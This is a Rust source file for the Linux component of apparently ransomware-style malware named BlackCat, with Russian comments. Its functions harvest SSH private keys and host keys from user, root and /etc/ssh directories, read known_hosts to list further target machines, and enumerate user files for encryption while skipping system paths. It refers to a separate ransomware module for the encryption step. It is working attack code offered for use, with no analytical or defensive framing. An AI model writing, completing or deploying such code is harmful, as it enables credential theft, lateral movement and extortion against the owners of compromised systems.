use std::fs;
use std::path::PathBuf;
use walkdir::WalkDir;

pub struct LinuxAttacker {
    config: crate::config::BlackCatConfig,
}

impl LinuxAttacker {
    pub fn new(config: crate::config::BlackCatConfig) -> Self {
        LinuxAttacker { config }
    }
    
    /// Находит SSH приватные ключи в системе
    pub fn harvest_ssh_keys(&self) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
        if !self.config.linux_options.enable_ssh_key_harvesting {
            return Ok(Vec::new());
        }
        
        println!("[*] Harvesting SSH keys...");
        let mut ssh_keys = Vec::new();
        
        // Проверяем стандартные локации
        let key_names = vec!["id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"];
        
        // Проверяем /home директории
        if let Ok(home_entries) = fs::read_dir("/home") {
            for user_dir in home_entries.flatten() {
                let ssh_path = user_dir.path().join(".ssh");
                
                if ssh_path.exists() {
                    for key_name in &key_names {
                        let key_path = ssh_path.join(key_name);
                        if key_path.exists() {
                            println!("[+] Found SSH key: {:?}", key_path);
                            ssh_keys.push(key_path);
                        }
                    }
                }
            }
        }
        
        // Проверяем /root/.ssh
        let root_ssh = PathBuf::from("/root/.ssh");
        if root_ssh.exists() {
            for key_name in &key_names {
                let key_path = root_ssh.join(key_name);
                if key_path.exists() {
                    println!("[+] Found SSH key in root: {:?}", key_path);
                    ssh_keys.push(key_path);
                }
            }
        }
        
        // Также проверяем /etc/ssh для host keys
        if let Ok(ssh_etc) = fs::read_dir("/etc/ssh") {
            for entry in ssh_etc.flatten() {
                let path = entry.path();
                if path.to_string_lossy().contains("_key") 
                    && !path.to_string_lossy().contains(".pub") {
                    println!("[+] Found system SSH key: {:?}", path);
                    ssh_keys.push(path);
                }
            }
        }
        
        println!("[*] Harvested {} SSH keys", ssh_keys.len());
        Ok(ssh_keys)
    }
    
    /// Читает known_hosts для обнаружения целевых хостов
    pub fn discover_targets_from_known_hosts(&self) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        let mut targets = Vec::new();
        
        // Проверяем /root/.ssh/known_hosts
        let known_hosts_path = PathBuf::from("/root/.ssh/known_hosts");
        if known_hosts_path.exists() {
            if let Ok(content) = fs::read_to_string(&known_hosts_path) {
                for line in content.lines() {
                    // Парсим known_hosts: <ip/hostname> <key_type> <key>
                    if let Some(host) = line.split_whitespace().next() {
                        if !host.starts_with('#') && !host.is_empty() {
                            targets.push(host.to_string());
                        }
                    }
                }
            }
        }
        
        println!("[*] Discovered {} targets from known_hosts", targets.len());
        Ok(targets)
    }
    
    /// Находит все файлы для шифрования в Linux
    pub fn enumerate_files_to_encrypt(&self, root_path: &str) -> Vec<PathBuf> {
        let mut files = Vec::new();
        
        for entry in WalkDir::new(root_path)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            let path = entry.path();
            
            if path.is_dir() {
                continue;
            }
            
            let extension = path.extension().unwrap_or_default().to_string_lossy();
            
            // Пропускаем системные файлы
            let is_system_file = self.is_system_file(path);
            if is_system_file {
                continue;
            }
            
            // Пропускаем исключенные расширения
            let is_excluded = self.config.exclude_extensions.iter()
                .any(|e| e == extension.as_ref());
            
            if !is_excluded {
                files.push(path.to_path_buf());
            }
        }
        
        println!("[*] Found {} files to encrypt in Linux", files.len());
        files
    }
    
    /// Проверяет, является ли файл системным
    fn is_system_file(&self, path: &std::path::Path) -> bool {
        let path_str = path.to_string_lossy();
        
        // Пропускаем важные системные директории
        path_str.contains("/proc/")
            || path_str.contains("/sys/")
            || path_str.contains("/dev/")
            || path_str.contains("/boot/")
            || path_str.contains("/etc/")
            || path_str.contains("/.ssh/")
    }
    
    /// Основная функция для Linux атаки
    pub async fn execute(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Starting BlackCat Linux attack...");
        
        // Фаза 1: Harvesting
        self.harvest_ssh_keys()?;
        self.discover_targets_from_known_hosts()?;
        
        // Фаза 2: Enumeration (Encryption будет в ransomware.rs)
        
        println!("[+] Linux attack preparation completed");
        Ok(())
    }
}
